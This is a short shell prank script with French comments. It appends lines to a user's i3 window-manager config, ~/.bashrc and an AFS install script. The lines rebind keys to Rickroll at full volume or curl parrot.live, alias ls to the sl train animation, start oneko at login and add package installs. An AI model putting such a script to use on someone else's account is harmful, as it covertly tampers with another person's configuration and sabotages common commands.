#!/bin/sh

name=$(whoami)
{
  echo
  echo
  echo
  echo "#---------------TU T'ES FAIS BZ-----------------"
  echo
  echo 'bindsym $mod4+shift+e exec "pamixer --set-volume 100; firefox https://www.youtube.com/watch?v=dQw4w9WgXcQ"'
  echo 'bindsym 0 "exec alacritty -e curl parrot.live"'
  echo 'exec "nohup oneko > /dev/null 2>&1 & disown"'
  echo
  echo "#-----------------fin de bz--------------------"
  echo
  echo
  echo

} >>~/.config/i3/config
{
  echo "nix profile install nixpkgs#oneko"
  echo "nix profile install nixpkgs#sl"
  echo "nix profile install nixpkgs#cowsay"
  echo "nix profile install nixpkgs#amixer"
} >>~/afs/.confs/install.sh

{
  echo "nohup oneko > /dev/null 2>&1 & disown"
  echo "curl ascii.live/rick"
  echo 'alias ls="sl -5"'
  echo 'alias sl="ls"'
  echo 'clear'
  echo "cowsay -f beavis.zen hello $name"
} >>~/.bashrc
clear
